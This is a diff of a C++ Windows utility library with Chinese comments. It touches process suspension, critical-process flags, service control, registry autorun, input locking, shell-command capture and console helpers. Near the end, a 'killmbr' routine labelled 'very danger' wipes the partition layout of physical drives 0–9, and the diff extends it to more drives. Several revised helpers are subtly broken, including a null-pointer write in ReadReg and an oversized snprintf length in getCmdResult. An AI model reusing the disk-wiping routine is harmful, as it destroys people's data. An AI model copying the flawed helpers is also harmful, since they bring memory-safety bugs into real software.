  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-int isProcess(const char *szImageName)
+DWORD isProcess(const char *szImageName)
 {
 	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //获得进程列表
 	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //拍摄快照
@@ -391,16 +625,21 @@ int isProcess(const char *szImageName)
 	while (bRet)
 	{ //不是最后一个进程，历遍所有
 		if (lstrcmp(szImageName, pe.szExeFile) == 0)
-			return pe.th32ProcessID;		 //返回进程id
+		{
+			CloseHandle(hProcess);
+			return pe.th32ProcessID; //返回进程id
+		}
+
 		bRet = Process32Next(hProcess, &pe); //下一个进程
 	}
+	CloseHandle(hProcess);
 	return 0;
 }
 
 /**************************************************
  *  @brief          获得进程路径
  *  @param          szImageName:进程名
- *  @note           头文件： #include <Windows.h> #include <TlHelp32.h> #include <string>
+ *  @note           头文件: #include <Windows.h> #include <TlHelp32.h> #include <string>
  *  @Sample usage   GetProcesslocation("cmd.exe");
  * 	@return  	    0不存在 非0为进程位置
  *  @calls          isProcess
@@ -409,43 +648,19 @@ int isProcess(const char *szImageName)
  * 	@date           2022/5/18
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-string GetProcesslocation(const char *szImageName)
+char *GetProcesslocation(DWORD dwProcessID)
 {
-	if (isProcess(szImageName) == 0)
-		return "0";
-	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 创建进程快照
-	PROCESSENTRY32 process = {sizeof(PROCESSENTRY32)};					   // 用来接收 hProcessSnap 的信息
-	while (Process32Next(hProcessSnap, &process))
-	{											// 遍历进程快照
-		string processName = process.szExeFile; // char* 转 string
-		if (processName == szImageName)			// 找到进程
-		{
-			//获得进程路径
-			PROCESSENTRY32 *pinfo = new PROCESSENTRY32;		//进程信息 （pinfo->dwSize = sizeof(PROCESSENTRY32);）
-			MODULEENTRY32 *minfo = new MODULEENTRY32;		//模块信息 （minfo->dwSize = sizeof(MODULEENTRY32);）
-			char shortpath[MAX_PATH];						//保存路径变量
-			int flag = Process32First(hProcessSnap, pinfo); // 从第一个进程开始
-			while (flag)
-			{
-				if (strcmp(pinfo->szExeFile, szImageName) == 0)
-				{																						// 如果是这个进程
-					HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pinfo->th32ProcessID); // 创建进程快照
-					Module32First(hModule, minfo);														// 把第一个模块信息给 minfo
-					GetShortPathName(minfo->szExePath, shortpath, 256);									// 把文件路径给 shortpath
-					break;
-				}
-				flag = Process32Next(hProcessSnap, pinfo); // 下一个进程
-			}
-			return shortpath;
-			break;
-		}
-	}
+	HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID); // 创建进程快照
+	MODULEENTRY32 *minfo = new MODULEENTRY32;
+	Module32First(hModule, minfo); // 把第一个模块信息给 minfo
+	CloseHandle(hModule);
+	return minfo->szExePath;
 }
 
 /**************************************************
  *  @brief          挂起进程
- *  @param          dwProcessID:进程ID,fSuspend: TRUE挂起,FALSE解除
- *  @note           头文件： #include <Windows.h> #include <TlHelp32.h>
+ *  @param          dwProcessID:进程ID fSuspend:TRUE挂起,FALSE解除
+ *  @note           头文件: #include <Windows.h> #include <TlHelp32.h>
  *  @Sample usage   SuspendProcess(isProcess("cmd.exe"),1);
  *  @calls          Debug
  * 	@return     	1成功，0 失败
@@ -454,9 +669,9 @@ string GetProcesslocation(const char *szImageName)
  * 	@date           2022/5/18
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
+BOOL SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
 {
-	bool ret = 1;
+	BOOL ret = 1;
 
 	Debug(); //获得debug权限
 
@@ -479,7 +694,6 @@ bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
 						ret = 0;
 				}
 			}
-		CloseHandle(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)); //关闭快照
 	}
 	CloseHandle(hSnapshot); //关闭快照
 	return ret;
@@ -487,8 +701,8 @@ bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
 
 /**************************************************
  *  @brief          设置/解除关键进程
- *  @param          id:进程id ,fSuspend:1关键，0普通
- *  @note           头文件： #include <Windows.h> #include <TlHelp32.h>
+ *  @param          id:进程id fSuspend:1关键，0普通
+ *  @note           头文件: #include <Windows.h> #include <TlHelp32.h>
  *  @Sample usage 	CriticalProcess(1000,1);
  * 	@return      	1成功，0失败
  *  @calls          Debug
@@ -498,7 +712,7 @@ bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
 typedef NTSTATUS(NTAPI *_NtSetInformationProcess)(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
-bool CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
+BOOL CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
 {
 	Debug(); //获得debug权限
 
@@ -514,7 +728,7 @@ bool CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
 /**************************************************
  *  @brief          停止服务
  *  @param          服务名
- *  @note           头文件： #include <Windows.h>
+ *  @note           头文件: #include <Windows.h>
  *  @Sample usage 	CloseService("CryptSvc");
  * 	@return  	    1成功，0失败
  * 	@author         xbebhxx3
@@ -522,16 +736,20 @@ bool CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
  * 	@date           2022/9/7
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool CloseService(char *service)
+BOOL CloseService(const char *service)
 {
 	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //打开服务管理器
 	if (hSC == NULL)
-		return false;
+	{
+		CloseServiceHandle(hSC);
+		return 0;
+	}
 
 	SC_HANDLE hSvc = OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //打开服务
 	if (hSvc == NULL)
 	{
 		CloseServiceHandle(hSC);
+		CloseServiceHandle(hSvc);
 		return false; //打开服务管理器失败，关闭HANDLE退出
 	}
 	SERVICE_STATUS status;
@@ -568,8 +786,8 @@ bool CloseService(char *service)
 
 /**************************************************
  *  @brief          启动服务
- *  @param          服务名
- *  @note           头文件： #include <Windows.h>
+ *  @param          service:服务名
+ *  @note           头文件: #include <Windows.h>
  *  @Sample usage 	StartService("CryptSvc");
  * 	@return  	    1成功，0失败
  * 	@author         xbebhxx3
@@ -577,16 +795,20 @@ bool CloseService(char *service)
  * 	@date           2022/9/8
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool StartService(char *service)
+BOOL _StartService(const char *service)
 {
 	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //打开服务管理器
 	if (hSC == NULL)
+	{
+		CloseServiceHandle(hSC);
 		return false;
+	}
 
 	SC_HANDLE hSvc = OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //打开服务
 	if (hSvc == NULL)
 	{
 		CloseServiceHandle(hSC);
+		CloseServiceHandle(hSvc);
 		return false; //打开服务管理器失败，关闭HANDLE退出
 	}
 	SERVICE_STATUS status;
@@ -598,7 +820,7 @@ bool StartService(char *service)
 	}
 	if (status.dwCurrentState != SERVICE_RUNNING) //如果未运行，启动服务
 	{
-		if (StartService(hSvc, NULL, NULL) == FALSE)
+		if (StartService(hSvc, 0, NULL) == FALSE)
 		{
 			CloseServiceHandle(hSvc);
 			CloseServiceHandle(hSC);
@@ -624,8 +846,8 @@ bool StartService(char *service)
 
 /**************************************************
  *  @brief          列出所有服务
- *  @param          服务名
- *  @note           头文件： #include <Windows.h>
+ *  @param          service:服务名
+ *  @note           头文件: #include <Windows.h>
  *  @Sample usage 	ListService();
  * 	@author         xbebhxx3
  * 	@version        1.0
@@ -636,11 +858,13 @@ void ListService()
 {
 	SC_HANDLE SCMan = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (SCMan == NULL)
+	{
+		CloseServiceHandle(SCMan);
 		return;
+	}
+
 	LPENUM_SERVICE_STATUS service_status;
-	DWORD cbBytesNeeded = NULL;
-	DWORD ServicesReturned = NULL;
-	DWORD ResumeHandle = NULL;
+	DWORD cbBytesNeeded, ServicesReturned, ResumeHandle;
 
 	service_status = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, 65536);
 
@@ -657,9 +881,7 @@ void ListService()
 								  &cbBytesNeeded,						 //输出参数，接收返回所需的服务
 								  &ServicesReturned,					 //输出参数，接收返回服务的数量
 								  &ResumeHandle);						 //输入输出参数，第一次调用必须为0，返回为0代表成功
-	if (ESS == NULL)
-		return;
-	for (int i = 0; i < static_cast<int>(ServicesReturned); i++)
+	for (int i = 0; i < ServicesReturned; i++)
 	{
 		printf("服务显示名:%s\n", service_status[i].lpDisplayName);
 		printf("\t服务名:%s\n", service_status[i].lpServiceName);
@@ -726,15 +948,17 @@ void ListService()
 		service_curren = OpenService(SCMan, service_status[i].lpServiceName, SERVICE_QUERY_CONFIG); //打开当前服务
 		lpServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 8192);							//分配内存， 最大为8kb
 
-		if (NULL == QueryServiceConfig(service_curren, lpServiceConfig, 8192, &ResumeHandle))
+		if (!QueryServiceConfig(service_curren, lpServiceConfig, 8192, &ResumeHandle))
+		{
+			CloseServiceHandle(service_curren);
+			CloseServiceHandle(SCMan);
 			return;
+		}
 		printf("\t启动命令:%s\n", lpServiceConfig->lpBinaryPathName);
 		CloseServiceHandle(service_curren);
 	}
 	CloseServiceHandle(SCMan);
 }
-
-//进程操作结束
 
 //串口操作开始
 
@@ -746,27 +970,9 @@ void ListService()
 	w.close()//关闭
 	w.send("at\r");//发送
 	w.receive()；//接收
- *  @note           头文件： #include <Windows.h>
- * 	@author         xbebhxx3
- * 	@version        5.0
- * 	@date           2022/8/12
- *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
+
 **************************************************/
-class SerialPort
-{
-public:
-	SerialPort();
-	~SerialPort();
-	bool open(const char *portname, int baudrate, char parity, char databit, char stopbit, char synchronizeflag); // 打开串口,成功返回true，失败返回false
-	void close();																								  //关闭串口
-	int send(string dat);																						  //发送数据或写数据，成功返回发送数据长度，失败返回0
-	string receive();																							  //接收数据或读数据，成功返回读取实际数据的长度，失败返回0
-private:
-	int pHandle[16];
-	char synchronizeflag;
-};
-SerialPort::SerialPort() {}
-SerialPort::~SerialPort() {}
+
 /**************************************************
  *  @brief          打开串口
  *  @param
@@ -784,7 +990,7 @@ SerialPort::~SerialPort() {}
  * 	@date           2022/8/13
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
-bool SerialPort::open(const char *portname, int baudrate = 115200, char parity = 0, char databit = 8, char stopbit = 1, char synchronizeflag = 1)
+BOOL SerialPort::open(const char *portname, int baudrate = 115200, char parity = 0, char databit = 8, char stopbit = 1, char synchronizeflag = 1)
 {
 	this->synchronizeflag = synchronizeflag;
 	HANDLE hCom = NULL;
@@ -831,7 +1037,7 @@ bool SerialPort::open(const char *portname, int baudrate = 115200, char parity =
 	}
 	if (!SetCommState(hCom, &p))
 		return false;							// 设置参数失败
-	COMMTIMEOUTS TimeOuts;						//超时处理,单位：毫秒，总超时＝时间系数×读或写的字符数＋时间常量
+	COMMTIMEOUTS TimeOuts;						//超时处理,单位:毫秒，总超时＝时间系数×读或写的字符数＋时间常量
 	TimeOuts.ReadIntervalTimeout = 1000;		//读间隔超时
 	TimeOuts.ReadTotalTimeoutMultiplier = 500;	//读时间系数
 	TimeOuts.ReadTotalTimeoutConstant = 5000;	//读时间常量
@@ -871,7 +1077,7 @@ void SerialPort::close()
  * 	@date           2022/8/13
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-int SerialPort::send(string dat)
+int SerialPort::send(const string dat)
 {
 	HANDLE hCom = *(HANDLE *)pHandle;
 	if (this->synchronizeflag)
@@ -965,14 +1171,13 @@ string SerialPort::receive()
 		return rec_str;
 	}
 }
-//串口操作结束
 
 //注册表操作开始
 
 /**************************************************
  *  @brief          读注册表
- *  @param          path:路径 key：key
- *  @note           头文件： #include <windows.h>
+ *  @param          path:路径 key:key
+ *  @note           头文件: #include <windows.h>
  *  @Sample usage   ReadReg("Software\\xbebhxx3", "aaa");
  *  @return         注册表值，0为失败
  *  @author         xbebhxx3
@@ -982,7 +1187,7 @@ string SerialPort::receive()
  **************************************************/
 char *ReadReg(const char *path, const char *key)
 {
-	static char value[32] = {0};
+	char *value = {0};
 	HKEY hKey;
 	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_EXECUTE, &hKey); //打开注册表
 	if (ret != ERROR_SUCCESS)
@@ -999,8 +1204,8 @@ char *ReadReg(const char *path, const char *key)
 }
 /**************************************************
  *  @brief          写注册表
- *  @param          path:路径 key：key, value：值
- *  @note           头文件： #include <windows.h>
+ *  @param          path:路径 key:key value:值
+ *  @note           头文件: #include <windows.h>
  *  @Sample usage   WriteReg("Software\\xbebhxx3", "aaa", "bbb");
  *  @return         1成功，0失败
  *  @author         xbebhxx3
@@ -1008,7 +1213,7 @@ char *ReadReg(const char *path, const char *key)
  *  @date           2022/3/28
  *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool WriteReg(const char *path, const char *key, const char *value)
+BOOL WriteReg(const char *path, const char *key, const char *value)
 {
 	HKEY hKey;
 	DWORD dwDisp;
@@ -1027,7 +1232,7 @@ bool WriteReg(const char *path, const char *key, const char *value)
 /**************************************************
  *  @brief          删除注册表项
  *  @param          path:路径
- *  @note           头文件： #include <windows.h>
+ *  @note           头文件: #include <windows.h>
  *  @Sample usage   DelReg("Software\\xbebhxx3");
  *  @return         1成功，0失败
  *  @author         xbebhxx3
@@ -1035,7 +1240,7 @@ bool WriteReg(const char *path, const char *key, const char *value)
  *  @date           2022/3/28
  *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool DelReg(const char *path)
+BOOL DelReg(const char *path)
 {
 	int ret = RegDeleteKey(HKEY_LOCAL_MACHINE, path); //删除注册表
 	if (ret == ERROR_SUCCESS)
@@ -1046,8 +1251,8 @@ bool DelReg(const char *path)
 
 /**************************************************
  *  @brief          删除注册表值
- *  @param          path:路径, value：值
- *  @note           头文件： #include <windows.h>
+ *  @param          path:路径, value:值
+ *  @note           头文件: #include <windows.h>
  *  @Sample usage   DelRegValue("Software\\xbebhxx3","aaa");
  *  @return         1成功，0失败
  *  @author         xbebhxx3
@@ -1055,7 +1260,7 @@ bool DelReg(const char *path)
  *  @date           2022/3/28
  *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool DelRegValue(const char *path, const char *Value)
+BOOL DelRegValue(const char *path, const char *Value)
 {
 	HKEY hKey;
 	LONG ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_QUERY_VALUE | KEY_WRITE, &hKey); //打开注册表
@@ -1072,7 +1277,7 @@ bool DelRegValue(const char *path, const char *Value)
 /**************************************************
  *  @brief          设置开机自启
  *  @param          name:程序名，fSuspend:1开启，0关闭
- *  @note           头文件： #include <windows.h>
+ *  @note           头文件: #include <windows.h>
  *  @calls          WriteReg,DelRegValue
  *  @Sample usage   AutoRun(程序名，1);
  *  @return         1成功，0失败
@@ -1081,7 +1286,7 @@ bool DelRegValue(const char *path, const char *Value)
  *  @date           2021/10/4
  *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool AutoRun(const char *name, BOOL fSuspend)
+BOOL AutoRun(const char *name, BOOL fSuspend)
 {
 	if (fSuspend == 1)
 	{
@@ -1095,13 +1300,11 @@ bool AutoRun(const char *name, BOOL fSuspend)
 	}
 }
 
-//注册表操作结束
-
 //编/解码操作开始
 
 /**************************************************
  *  @brief          Url编码
- *  @param          需要编码的东西
+ *  @param          URL:需要编码的东西
  *  @Sample usage   CodeUrl(需要编码的东西);
  *  @return     	编码后的
  *  @author         xbebhxx3
@@ -1141,7 +1344,7 @@ string CodeUrl(const string &URL)
 
 /**************************************************
  *  @brief          Url解码
- *  @param          需要解码的东西
+ *  @param          URL:需要解码的东西
  *  @Sample usage   decodeUrl(需要解码的东西);
  *  @return     	解码后的
  *  @author         xbebhxx3
@@ -1181,16 +1384,16 @@ string DecodeUrl(const string &URL)
 }
 
 /**************************************************
- *  @brief          加密
- *  @param          需要加密的东西
- *  @Sample usage   x3code(需要加密的东西);
+ *  @brief          x3code加密
+ *  @param          c:需要加密的东西
+ *  @Sample usage   x3code("xbebhxx3");
  *  @return     	加密后的
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/30
  *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
  **************************************************/
-string x3code(string c)
+char *x3code(char *c)
 {
 	for (int i = 0; i <= sizeof(c); i++)
 	{
@@ -1223,17 +1426,17 @@ string x3code(string c)
 	}
 	return c;
 }
-//编码操作结束
 
 //改变颜色开始
 
 /**************************************************
  *  @brief          RGB初始化
  *  @Sample usage   rgb_init()
- *  @note	    	头文件： #include<Windows.h>
- *  @author         jlx
+ *  @note	    	头文件: #include<Windows.h>
+ *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/5
+ *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
  **************************************************/
 void rgb_init()
 {												   // 初始化
@@ -1246,36 +1449,39 @@ void rgb_init()
 	dwOutMode |= 0x0004;
 	SetConsoleMode(hIn, dwInMode);	 //设置控制台输入模式
 	SetConsoleMode(hOut, dwOutMode); //设置控制台输出模式
+	CloseHandle(hIn);
+	CloseHandle(hOut);
 }
 
 /**************************************************
  *  @brief          RGB设置
- *  @param	    	wr:字体红,wg:字体绿,wb:字体蓝,br:背景红,bg:背景绿,bb:背景蓝 (0-255)
+ *  @param	    	wr:字体红 wg:字体绿 wb:字体蓝 br:背景红 bg:背景绿 bb:背景蓝 (0-255)
  *  @Sample usage   rgb_set(255,255,255,0,0,0);
  *  @note	    	在这之前先运行 rgb_init();
- *  @author         jlx
+ *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/5
+ *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
  **************************************************/
 void rgb_set(int wr, int wg, int wb, int br, int bg, int bb)
 {
 	printf("\033[38;2;%d;%d;%dm\033[48;2;%d;%d;%dm", wr, wg, wb, br, bg, bb); //\033[38表示前景，\033[48表示背景，三个%d表示混合的数
 }
 
-//改变颜色结束
+//其他
 
 /**************************************************
  *  @brief          锁定鼠标键盘 (需要管理员权限)
- *  @param          NULL
+ *  @param          lockb:1锁定,0或为空解除
  *  @return         1成功，0失败
- *  @note           头文件： #include <Windows.h>
- *  @Sample usage   lockkm(1); 锁定，lockkm(0); 解锁
+ *  @note           头文件: #include <Windows.h>
+ *  @Sample usage   lockkm(1); 锁定 lockkm(0); lockkm(0);解锁
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/28
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool lockkm(bool lockb = false)
+BOOL lockkm(BOOL lockb = false)
 {
 	HINSTANCE hIn = NULL;
 	hIn = LoadLibrary("user32.dll");
@@ -1295,8 +1501,8 @@ bool lockkm(bool lockb = false)
 
 /**************************************************
  *  @brief          获得鼠标位置
- *  @param          NULL
- *  @note           头文件： #include <Windows.h>
+ *  @param          x:x坐标，y:y坐标
+ *  @note           头文件: #include <Windows.h>
  *  @Sample usage   mouxy(鼠标x坐标，y坐标);
  *  @author         xbebhxx3
  *  @version        1.0
@@ -1314,7 +1520,7 @@ void mouxy(int &x, int &y)
 /**************************************************
  *  @brief          清屏
  *  @param          NULL
- *  @note           头文件： #include <Windows.h>
+ *  @note           头文件: #include <Windows.h>
  *  @Sample usage   cls();
  *  @author         xbebhxx3
  *  @version        1.0
@@ -1333,12 +1539,13 @@ void cls()
 	FillConsoleOutputCharacter(hdout, ' ', size, pos, &num);
 	FillConsoleOutputAttribute(hdout, csbi.wAttributes, size, pos, &num);
 	SetConsoleCursorPosition(hdout, pos); //光标定位到窗口左上角
+	CloseHandle(hdout);
 }
 
 /**************************************************
  *  @brief          str删除空格
  *  @param          s:要删除空格的string变量
- *  @note           头文件： #include <Windows.h>
+ *  @note           头文件: #include <Windows.h>
  *  @Sample usage   delspace(要删除空格的string变量);
  *  @author         xbebhxx3
  *  @version        1.0
@@ -1355,7 +1562,7 @@ void delspace(string &s)
 
 /**************************************************
  *  @brief          获得当前ip
- *  @note           头文件： #include <WinSock2.h>	编译时加-lgdi32 -lwsock32
+ *  @note           头文件: #include <WinSock2.h>	编译时加-lgdi32 -lwsock32
  *  @Sample usage   ip();
  *  @return         本机主网卡ip
  *  @author         xbebhxx3
@@ -1363,7 +1570,7 @@ void delspace(string &s)
  *  @date           2021/9/23
  *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
  **************************************************/
-string getIp()
+char *getIp()
 {
 	WSADATA wsaData;
 	int ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -1376,32 +1583,37 @@ string getIp()
 /**************************************************
  *  @brief          获得当前用户名
  *  @Sample usage   GetUser();
- *  @return      	当前用户名
- *  @note		    头文件： #include<Windows.h>
+ *  @return      	当前用户名 0失败
+ *  @note		    头文件: #include<Windows.h>
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/2/28
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-string GetUser()
+char *GetUser()
 {
-	char currentUser[256] = {0};
-	DWORD dwSize_currentUser = 256;
-	GetUserName(currentUser, &dwSize_currentUser); //获得用户名
-	return currentUser;
+	static CHAR GetUser_cUserNameBuffer[256];
+	DWORD dwUserNameSize = 256;
+
+	if (GetUserName(GetUser_cUserNameBuffer, &dwUserNameSize))
+	{
+		return GetUser_cUserNameBuffer;
+	}
+	else
+		return 0;
 }
 
 /**************************************************
  *  @brief          获得系统版本
  *  @Sample usage   GetSystemVersion();
  *  @return         系统版本
- *  @note		    头文件： #include<Windows.h>
+ *  @note		    头文件: #include<Windows.h>
  *  @author         xbebhxx3
  *  @version        4.0
  *  @date           2021/2/24
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-string GetSystemVersion()
+const char *GetSystemVersion()
 {
 	OSVERSIONINFO osv = {0};
 	osv.dwOSVersionInfoSize = sizeof(osv);
@@ -1436,23 +1648,22 @@ string GetSystemVersion()
  *  @date           2022/3/5
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-char *getCmdResult(char *Cmd)
+char *getCmdResult(const char *Cmd)
 {
-	char Result[1024000] = {0};
+	static char getCmdResult_Result[102400] = {0};
 	char buf1[1024000] = {0};
 	FILE *pf = popen(Cmd, "r");
 	while (fgets(buf1, sizeof buf1, pf))
-		snprintf(Result, 1024000, "%s%s", Result, buf1);
+		snprintf(getCmdResult_Result, 1024000, "%s%s", getCmdResult_Result, buf1);
 	pclose(pf);
-	memset(Cmd, '\0', sizeof(Cmd));
-	return Result;
+	return getCmdResult_Result;
 }
 
 /**************************************************
  *  @brief          居中输出
  *  @param          str:要输出的字符串,y:输出到第几行;
- *  @Sample usage   OutoutMiddle(字符串,行数);
- *  @note	        头文件： #include<Windows.h>
+ *  @Sample usage   OutoutMiddle("xbebhxx3",1);
+ *  @note	        头文件: #include<Windows.h>
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/8
@@ -1462,41 +1673,66 @@ void OutoutMiddle(const char str[], int y)
 {
 	COORD pos;
 	HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE); //获得输出的句柄
+
 	CONSOLE_SCREEN_BUFFER_INFO bInfo;
 	GetConsoleScreenBufferInfo(hOutput, &bInfo); //获取控制台屏幕缓冲区大小
+
 	int dwSizeX = bInfo.dwSize.X, dwSizey = bInfo.dwSize.Y;
 	int len = strlen(str); //获取要输出的字符串的长度
 	int x = dwSizeX / 2 - len / 2;
-	pos.X = x;								//横坐标
-	pos.Y = y;								//纵坐标
+	pos.X = x; //横坐标
+	pos.Y = y; //纵坐标
+
 	SetConsoleCursorPosition(hOutput, pos); //移动光标
 	printf("%s", str);						//输出
+	CloseHandle(hOutput);
 }
 
-//隐藏窗口 #include<Windows.h>
-void HideWindow()
+/**************************************************
+ *  @brief          全屏最大化
+ *  @param          hwnd:窗口hwnd
+ *  @Sample usage   full_screen(GetForegroundWindow());
+ *  @note	        头文件: #include<Windows.h>
+ *  @author         xbebhxx3
+ *  @version        1.0
+ *  @date           2022/3/8
+ *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
+ **************************************************/
+void full_screen(HWND hwnd)
 {
-	ShowWindow(GetForegroundWindow(), SW_HIDE);
-}
-
-//真·全屏 最大化 取消标题栏及边框#include<Windows.h>
-void full_screen()
-{
-	HWND hwnd = GetForegroundWindow();
 	int cx = GetSystemMetrics(SM_CXSCREEN); /* 屏幕宽度 像素 */
 	int cy = GetSystemMetrics(SM_CYSCREEN); /* 屏幕高度 像素 */
 
 	LONG l_WinStyle = GetWindowLong(hwnd, GWL_STYLE); /* 获取窗口信息 */
-	/* 设置窗口信息 最大化 取消标题栏及边框 */
-	SetWindowLong(hwnd, GWL_STYLE, (l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
 
+	SetWindowLongPtr(hwnd, GWL_STYLE, GetWindowLongPtr(hwnd, GWL_STYLE) & ~(WS_CAPTION | WS_SIZEBOX)); //设置窗口信息 最大化 取消标题栏及边框
 	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx + 18, cy, 0);
+}
+
+/*********************************************
+ *  @brief           生成随机数
+ *  @param           min:最小值,max:最大值
+ *  @return          随机数
+ *  @note            头文件: #include <random> #include <time.h>
+ *  @author          xbebhxx3
+ *  @version         版本号
+ *  @date            日期
+ *  @copyright       Copyright (c) 2022 by xbebhxx3, All Rights Reserved
+ **********************************************/
+long long radom(long long min, long long max)
+{
+	random_device seed; //硬件生成随机数种子
+	POINT p;
+	GetCursorPos(&p);										  //获取鼠标坐标
+	ranlux48 engine(seed() + time(0) - (p.x * p.y) + rand()); //利用种子生成随机数引擎
+	uniform_int_distribution<> distrib(min, max);			  //设置随机数范围，并为均匀分布
+	return distrib(engine);									  //随机数
 }
 
 /**************************************************
  *  @brief          破坏mbr(very danger)
  *  @Sample usage   killmbr();
- *  @note		    头文件： #include<Windows.h> #include<ntddscsi.h>
+ *  @note		    头文件: #include<Windows.h> #include<ntddscsi.h>
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/8
@@ -1515,6 +1751,16 @@ void killmbr(){
 	DiskHandle=CreateFile("\\\\.\\PhysicalDrive3",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
 	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
 	DiskHandle=CreateFile("\\\\.\\PhysicalDrive4",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
+	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
+	DiskHandle=CreateFile("\\\\.\\PhysicalDrive5",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
+	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
+	DiskHandle=CreateFile("\\\\.\\PhysicalDrive6",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
+	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
+	DiskHandle=CreateFile("\\\\.\\PhysicalDrive7",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
+	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
+	DiskHandle=CreateFile("\\\\.\\PhysicalDrive8",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
+	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
+	DiskHandle=CreateFile("\\\\.\\PhysicalDrive9",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
 	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
 }
 **************************************************/
